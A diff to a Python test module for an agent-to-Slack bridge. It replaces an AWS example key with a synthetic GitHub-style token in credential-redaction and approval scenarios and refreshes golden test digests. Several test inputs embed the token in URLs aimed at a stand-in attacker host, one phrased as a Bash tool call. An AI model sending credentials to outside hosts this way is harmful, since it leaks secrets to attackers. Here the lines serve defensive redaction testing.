@@ -36,7 +36,12 @@ from kiro_crew.acp.types import STOP_REASON_COMPACTION_FAILED
 from kiro_crew.config.loader import ACTIVATION_REVIEW
 from kiro_crew.providers.base import LLMEvent
 from kiro_crew.slack import handler
+from kiro_crew.testing.synthetic_credentials import github_classic
 from kiro_crew.testing.wait import async_wait_until
+
+#: A token by its published format. The AWS documentation example key ID these
+#: scenarios used is an identifier the redactor keeps visible, so it redacts nothing.
+_TOKEN = github_classic(seed=145)
 
 # ── golden scenarios ──────────────────────────────────────────────────────────
 
@@ -69,8 +74,8 @@ async def _scenario_top_level_no_placeholder(log):
 async def _scenario_credential_redaction(log):
     """A credential in the stream: per-chunk redaction, overwrite, one notice."""
     events = [
-        _text("key AKIAIOSFODNN7EXAMPLE and "),
-        _text("see https://evil.example.invalid/x?d=AKIAIOSFODNN7EXAMPLE"),
+        _text(f"key {_TOKEN} and "),
+        _text(f"see https://evil.example.invalid/x?d={_TOKEN}"),
         _complete(),
     ]
     await _turn(log, events)
@@ -458,7 +463,7 @@ async def _scenario_linked_approval(log):
             "1700000000.000001",
             "req-9",
             "dashboard:chat-1",
-            "Bash https://evil.example.invalid/?k=AKIAIOSFODNN7EXAMPLE",
+            f"Bash https://evil.example.invalid/?k={_TOKEN}",
             "echo hi",
             slot_key="chat-1",
         )
@@ -481,7 +486,7 @@ async def _scenario_linked_thread_routes_to_slot(log):
     )
     slot = _Slot("chat-2", running=True)
     log.monkeypatch.setattr(handler, "_dashboard_state", _Dashboard(log, {}, linked=slot))
-    await _command(log, "route me https://evil.example.invalid/?t=AKIAIOSFODNN7EXAMPLE")
+    await _command(log, f"route me https://evil.example.invalid/?t={_TOKEN}")
     await _command(log, "!voice")
     await _command(log, "sessions")
     await _command(log, "intruder", user="USTRANGER")
@@ -982,71 +987,71 @@ SCENARIOS = {
 #: scenario sends, audits, counts or asks of the session manager changes its digest; the
 #: failure prints the transcript it produced.
 _GOLDEN_DIGESTS: dict[str, str] = {
-    "agent_commands": "53f8669524467a6e0535e78cb6d7c76320d2941050133cf251e8840208e5e878",
-    "append_refused_then_rotated": "9c1eedd5bddda91331b57115e526c08f99efd760808df9e158568d09f55d2bbc",
-    "auto_approval_mode": "306f8e3b049b7630c658941173cf939e4750de03c8159847a66848808b034fec",
-    "builders_and_filters": "e83b3068f914e362d4738a90e786aa0065c719f516678efb0b6a72daee1eab84",
-    "cancelled_messages": "ecbdff98df1658e87972dc20679d6c3eb80d050a383a74f39f4ee06478c68c3a",
-    "cancelled_stop_reason": "a597b2ba7db789e3eab7fad4e42c9ee89391d8c4010e01ae5c3f943a0e107a64",
-    "cmd_allowed_denied": "0802fc63efe6e37f62e532419b17548240110c89100b8b4925703f80306e2621",
-    "cmd_allowlist_and_channel": "0b64b0c42209ad4e75596212067a1b7fd2c7dabdba488324355a4cdcca3f9d43",
-    "cmd_compact": "b70200b397f2c31b14e23658e410ed24509d3db9a8581262cd721a2892793431",
-    "cmd_dashboard_bad_duration": "38a7cb5332a1ba5ff255ec3303f56379bdd35ad259fede729cbba8f807d1b162",
-    "cmd_link_to_dashboard_unavailable": "3a7c8916de8eec9ddf603e7ccaaa8d892e682a9f5d7a56783277ea8e64955fdd",
-    "cmd_owner_only_denied": "91655cbd5755fc47ca671f71bff1ef08fb9e5bd93da44cfa302a56330f569275",
+    "agent_commands": "b93ca58a17fc76956d833e54b7ffbd5696eb7515125f4433026426aed0068b4e",
+    "append_refused_then_rotated": "74ae47d01df67f0a965be8019ad238f9dafcf06a8a36fd928979968bacd90942",
+    "auto_approval_mode": "29509a2d62229a76a6fa55f510926911391f9313d9a6707fe93ebb0cfd8295e2",
+    "builders_and_filters": "e3e97a7b178d3f9eb3f9f848454cd0ed5176145027a3450bbcd1213406249ccd",
+    "cancelled_messages": "2994cd1c4a6c3ff282f1f2ddefdd5b81a0c8abc3ea88ac27640f186cde719051",
+    "cancelled_stop_reason": "226839e24ee48a41dbe3c12937c08dbabdf61d4bb12619e6be2b488a05971c09",
+    "cmd_allowed_denied": "beb016ef3125295cf0f42d2fb9eed059f1189de6afa2fd2656088f5f65ab03ab",
+    "cmd_allowlist_and_channel": "a65200c6077f9e606d76a838e8adbf1afa83d947f1234b07e1fa3933986a25b4",
+    "cmd_compact": "acde6b121f0029b954b26305e0035ef3655ff9c67b80676428e9db634c489fb3",
+    "cmd_dashboard_bad_duration": "f1f95df4f18df7b7d7c21e9b222c80b90e00ae21536a36b0f441ddc8bfe45763",
+    "cmd_link_to_dashboard_unavailable": "25c5eae0dc48ad7d0125ddb5c432397b8aba852511ab8f061efc6d8ff86c2f2c",
+    "cmd_owner_only_denied": "a7755851bd9026b718f74e37ca04b46524f2ae63024053887fbb98f7e9bbccbe",
     "cmd_sessions": "637197868fc541a4013406679648954e232c2467f86a34afcee2c9c09ba8bf15",
     "cmd_status": "99a5ab8189db5fc1241f21fd9fbc161a6696609d0597bd78cd183b445e00a763",
-    "cmd_stop_no_session": "de5c5a671702ba32d7a8fef5d2528b07a3803d772f21f8d5a0aa64206f5b1d42",
-    "cmd_stop_running": "1698b578b632c700afdb4c0a717b6ae66493a42dda13e6a9be522506f133262e",
-    "cmd_ta_and_project": "da91983c4edfed45f574c7c82096c52ab7f94d02aa2b005a8abb698c9b15e58b",
-    "cmd_title": "5f25036c41f40fff19e669411f763e9568c27bac69821dd769da1e49c536e205",
-    "cmd_unknown_bang": "3ac3bfd77e7207cdf6a0a2d5c394d7acdcf42c7833ef8f49d17bdd4ff17ddc4a",
-    "cmd_voice": "3688c2b4bd978ee8cd953b840db52c9d27ad24eb6bf9e5746c5832ba9b8ad95e",
-    "cmd_yolo_status": "5370a104288a5f4cd6c22a392cc9c04d006d7cf1bcdaaf60ff4a95a1a6b2ee16",
-    "comment_hold_and_brackets_at_end": "d0fd5228d627cd7a7c7a9e9d340cb7b82f6227512a6004c2045d9b77ce25722f",
-    "compaction_failed_permanent": "12425d478afceb49e320ea9ea894199006a9905edf42d2467d43daba9d7881db",
-    "compaction_failed_transient_replay": "0288ec1f38a1eb4f4ab8c73ca19cf7f7434715a6671b2c14b4a0ff046dbc0e51",
-    "credential_redaction": "fb606f07f49ed7c4b3bb6b0ce484ac99fd7d8879a8cd287daca999b93d2d80e0",
-    "delivery_failures": "f5ec0a47d40bae2da19f6d12f94317a7470a474356f1b13c904c27222370b5ad",
-    "error_acp": "8efbab04ebf42b0989c9d19a805da15a77bd032d920f031a215a66f7ea6f2e4c",
-    "error_after_partial_text": "816e7d73a1bd9eed97fb1027758343201ff318e64eae58df0e399c4c69384171",
-    "error_from_trusted_bot": "f347570f5f67a5ca3659343ec439a0802b29970f757e66c3a5330e530afac193",
-    "error_process_died": "d35a33b0b576068801e5fe522cc02df56a62acf4d66d4e58e7e294311cd15815",
-    "error_prompt_busy": "3617d636151fb29f5ff88ac9e803a226a1f77bec56fc013e1bf32f9a65484de6",
-    "error_timeout": "608f9764fe3ed40a4e758a69d881f2c829e08a6aa89302e9f007a1c1b463db44",
-    "error_unexpected": "ae7bc265f3ffd8441f818df443f1586b1e0f3c6d2009d7b707220f0b6e92829a",
+    "cmd_stop_no_session": "a81987d96f25e0732c71ebc18e27ee00148f7768e4ffd0bd39e381aa273f0c1a",
+    "cmd_stop_running": "8b80053065f319c5c216d212a01d86344311d51876d9d1ac09c50731e531b484",
+    "cmd_ta_and_project": "8b36f1d7d80aacd9063243e17c72bf3582feafdc1b1de182060e3baae2ccb3f4",
+    "cmd_title": "b008fbe213c86c0e7051926bd790ae650e4624b75784a5abe0beebe89e68d15e",
+    "cmd_unknown_bang": "0565bd2700edba4cc2222b8b9597bdb651c5a78ea7e3adf16a542511f02c0b23",
+    "cmd_voice": "50e0d19d8380a1174c4099bc40efa270dc3fa08b574dfef152624ee2ad838ad5",
+    "cmd_yolo_status": "18be13a948c8b441fb85e7cdd52b7339509bce6135cb5b0e9dd5acb41d8a87e9",
+    "comment_hold_and_brackets_at_end": "156ac4dae1a1f2e4f6bbe265041216701d5c535f0ae9eade87b56aafe729090d",
+    "compaction_failed_permanent": "8e17c4182dc6a589a4c8a18fab5e0b27749c01eea3f57dbffebbd7ea755676c7",
+    "compaction_failed_transient_replay": "b82af0d3699c9a57b866826e528d2397866269361055ee8524a46f1b3ba63b47",
+    "credential_redaction": "e9a2c2a3b96584afb8f3194ad6644f3b9e7e9956cd8a2df9d967143dd05dc4bf",
+    "delivery_failures": "3e1a09065665a53e4aac5e0681a8ab729e3a81de30c766bb82950b77e12d411b",
+    "error_acp": "06fd2d5469afde23037dbeeff71e1eaec744018ede6ef0fe8cb1d79132ac0666",
+    "error_after_partial_text": "ef25f5c91959262c1f7c12c621a7183299b321ccfd5bbb12a209111fcd2ff86f",
+    "error_from_trusted_bot": "28c4ce364163847a6daa7c47fc8fe91a341b8dba705fbddf40380e6b7855f527",
+    "error_process_died": "84bf034e1a81de8b5d995a776abf24a64f132e14acca2ec53475d7a0adbd106b",
+    "error_prompt_busy": "328e6f93adbf66eb25440c99f4ba97689ea228057744f6d372f9bc4759f28d33",
+    "error_timeout": "0b380d6808ca34ad207ca6ea018683daf76b87ca63486f8dc246028a554811ab",
+    "error_unexpected": "94748466a9d086a4e62dc0ce19b8d922fc3f7adc5efd66692b7fb7ead03d35a5",
     "hook_auto_reply": "f976c5ff2c752a2259381bcfd9fbf6e2fb72ca95fcdb1bbfa53c5ddf98f68f53",
-    "hook_deny_and_flag": "e79ac03814431a60817e2f4e734ec3230ea3140c0af85e289184df6bec622b88",
+    "hook_deny_and_flag": "10b9ff1ecf3925cb725a923893e7112603f5e9ce92b468795c11cb712cecb86d",
     "interaction_edges": "80e9ab4e4ba623f57a0360df952f7d6c787348fc81ff69368bbfcfb2ce22bc8f",
-    "interactive_approve": "b20c7df4968528b252f984f62503202294c5c0caa75eb04be3231f2310ef5110",
-    "interactive_approve_answered": "08dd0d7d62480853b98cff28fa65d158d327339f2dd69ed2b74fbbbfe8c6356a",
-    "interactive_reject": "7e51857cb81a6b1806af280a1f441a7962f3f2e4e7ce8dd3cb440f6dfc1960c6",
-    "interactive_timeout": "e2a9e8c0d6398cbe68f81f17eb94ade5c20921c6221d4100f521ac5736448e30",
-    "interactive_trust_in_dm": "8b16590ebe23568228ed607a24202a50b8edc4e80aef76e5774c7bef013e5ad5",
-    "keyword_commands": "2acbad12808587a76ab0d64101da6d512b3ba8f0bc1f28ed2dab246d7a88b386",
-    "linked_approval": "fd9f6840aa0486ea1af5d8380a8c28c5803407faed28e6271913603adb0d5fd4",
-    "linked_dashboard_session": "2c49bd5afefcf913c1ab6a60bdeed6a7a3c21e826e5ffa985f0abe3e6959c0f9",
-    "linked_thread_routes_to_slot": "0a481316843499aaa985a421a16e4c2510f5a1ff7b1a9a56e9f6cf4a37832e6e",
-    "mention_prefixed_bang": "48e18741859e097ccf60e7d04b6c70546baa391b3451b065b997348a4a5d7734",
-    "pinned_answer": "28c748b1cf0d80d87ab2efccaf102d311fcc583d2a63992bc2fb86a5fb829016",
-    "presentation_raises": "648684b8c85a999655782b4553854eea6e4b85302ecf65951643680add824f8d",
-    "privacy_modifiers": "4d2844c96b28e07a815c7e1b3d2e943d5bd70e3fb7457dd4106f6cf4781d12ec",
-    "reasoning_only": "c89a99216bc42101b006b40d7dce9f582dae7fe5c8c53731764517c963dfc88f",
-    "replay_stopped_before_prompt": "a47f827241dc1d097d5a9e3f154f58f6031e925ebe35dc0196713445e56a812f",
-    "review_mode": "89331664b810662dc31b0a11065705d42ef651896c65e7f6a89a32958509a53a",
-    "shared_runtime_deaths": "7448fcb0e2a7665b8dfbf9e6343876d16fa9f2dab262ac2db302f9defef129d7",
+    "interactive_approve": "7910e6d9314a953f6d1bfc401b42d8438e3deeb5e14cd3911591d2b0549872e2",
+    "interactive_approve_answered": "578cb36b02a09c12487dc7a6213ce88bf03deb12882f9b95a7451f4fa7aa277c",
+    "interactive_reject": "cc8bdd7e35672b6f12f1ba67242ed5d8f29dca687f9214195c0f719f7b69e536",
+    "interactive_timeout": "010ca2d494419cf23be3ac932f9c5a17688390468412fd008a33eff9ae93f291",
+    "interactive_trust_in_dm": "272c663033bc6f3c909a8451077b41abc235e7f3e9e14e198b92378e5f46f2fa",
+    "keyword_commands": "71cca229aa526865a5eb6301ed375f01a7e1488eacee8ce4b7e5fa18145dabbe",
+    "linked_approval": "2345fddc33ddcf0c3153e5a67d543815e135c0fcffc42009ce7265bedb752ed0",
+    "linked_dashboard_session": "ecedf09daa6bdda1cd56ac3c2a0b5526f9085add1268244dbda712b1da405a71",
+    "linked_thread_routes_to_slot": "03d20e7a8917b6f2bb264c9cb5923905d3240aa9574040de4a7d054dca11ef12",
+    "mention_prefixed_bang": "7ef124d7c4d786368f2a5636922467cfdc9d16f5e879b5cb18bbc9a788b43dee",
+    "pinned_answer": "007c75173cdc33e068bd9d578b9d45386f64d330b01e59dfdab46268bbcbd47d",
+    "presentation_raises": "84346dcfca503b2becffe402f0a33e2f55839967049a5b9322486441f4c3bfa4",
+    "privacy_modifiers": "de5ca3b278d8cfc2c651eb7bd03a00f7e89a883d2391fe19a66b484e93610322",
+    "reasoning_only": "6375727423d844ae68f7e7477cc4bcf9887df592d607b2831e0e694a10eb47bb",
+    "replay_stopped_before_prompt": "749a1cedba19eef4067b0ab5669f9d9b394f49d96aa6e61c0ccb310cc487519a",
+    "review_mode": "93262f8371c3e7f94825fdedbd9de6c3595ac6b3c1664606e3c910364062961f",
+    "shared_runtime_deaths": "9eca1aef40b253cd0d1bc127d5261947c6518da02e4c4be684865cac6d90f844",
     "status_reactions": "0c53791195fe55281c9103c0dbe4e8b101d63bfaba331f0856f6fe82fa35f9cc",
-    "streamed_turn": "9bcdb4e071c8a4399e0f4e42b40c7103e4bf35572323d07fa08c4f93573f98e2",
-    "tool_then_rejected_while_streaming": "470973604465d0e22ca8e541d8ff6039b68cdf04ceb0cbadb5d109d9aecfa124",
-    "top_level_no_placeholder": "da9023327a43497b07e9ca44f6cb54e53eed7d1cfb8a048e4d09531e52cabce7",
-    "transport_floor_refusal": "9fb31cc46463b655120bcd722e0a1a7b70c07037bc472d606b76c451bab30ea3",
-    "trusted_session": "07445e20db083c7eaf2f75b3590ad82a9637bc4add04a00226c42b26b3ec4058",
-    "turn_ceiling_and_shutdown": "e19f2cde78799109801f78a2eea9e872d4ca85828085cb2d59ae4ff03b0864cd",
-    "turn_with_history": "9415bdf1a846b40534a50e347334a7f4fba33b1fa54c840e3d9d94ae606efa1c",
-    "unstreamed_long_reply": "24762f37e6a615577ccdb6f679d8c5cc8bc217a41620d12a1c1306d454cb4a46",
-    "unstreamed_tool_and_auto_approval": "cfe992c51ae6285338d5081142175a990428ecd963ab312766c8439b8f697c1f",
-    "voice_reply_requested": "24c013573da87bd3c996764096b05815b5104674ed61feca7897e9ad10eac93f",
-    "wait_tool_seals_stream": "198489a363db046df74be769a5ee27de977f3d53c65d8a145d7209d23fbfb394",
+    "streamed_turn": "77f9fa5a4978301a6e1edd5df453230fc656b91b0ce4928db86444ff440aa4b8",
+    "tool_then_rejected_while_streaming": "a9de9e7b2b6a32c76ecc102074985b6ef5ec81bb642f1aab9628f37d0c936680",
+    "top_level_no_placeholder": "a902ae33e7c04a9f44e48bbb95673cea8cc19d3ef2d08da445694662820f4b26",
+    "transport_floor_refusal": "e05a6f7876506a74ba121b858e7efacb950977221d12c4859e24a74d145dc141",
+    "trusted_session": "f6f137a62a8308591a242c5964a4c50c4c24d842f26b796ccf7a12bd84653fd7",
+    "turn_ceiling_and_shutdown": "007400c245c31698a0e019a54a3c48a4fac8a525c85a556137680ff74bda5231",
+    "turn_with_history": "1f18b5eb2ff01b64f886b1556b51352c78e3633334206870d9a5f12aa470330c",
+    "unstreamed_long_reply": "8c1c1fef5bf150b5d5782e8eb207e441a6425673f5f37ee7aa9076f0d01e9997",
+    "unstreamed_tool_and_auto_approval": "fbd822b1838c1ef3d1eee93990997623af256fb1333996fa321457a1498f310c",
+    "voice_reply_requested": "de80b651354969dd70e73a271a6e6719226dfa77f961f1df2694a16de9f948e4",
+    "wait_tool_seals_stream": "be9f2cc50bf179a53d895a00ce6cc4b24b5f1f156c911ff72d73e17b78539ae6",
 }
 
 
